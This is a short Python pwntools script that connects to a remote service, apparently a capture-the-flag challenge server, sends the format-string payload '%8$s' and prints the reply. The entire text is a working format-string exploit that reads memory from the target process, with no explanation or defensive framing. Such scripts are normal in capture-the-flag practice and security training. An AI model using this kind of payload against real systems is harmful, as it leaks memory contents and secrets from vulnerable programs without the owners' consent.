from pwn import *

sh = remote('gz.imxbt.cn',20459)

payload=b'%8$s'
sh.sendline(payload)
print(sh.recvline())